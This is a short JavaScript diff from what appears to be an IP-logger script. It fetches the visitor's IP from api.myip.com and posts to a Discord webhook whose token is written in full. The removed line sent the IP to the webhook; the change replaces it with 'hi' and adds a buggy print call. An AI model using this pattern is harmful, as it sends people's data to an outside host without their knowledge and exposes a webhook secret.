@@ -11,6 +11,8 @@
   req.open("GET", "https://api.myip.com");
   
   req.setRequestHeader("Content-type", "application/json");
+  req.send()
+  print(req.responseText)
   let dataaa = {'content':'test'}
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
@@ -20,7 +22,7 @@
   const params = {
     username: "Hi :3",
     avatar_url: "",
-    content: req.responseText
+    content: "hi"
   }
 
   request.send(JSON.stringify(params));
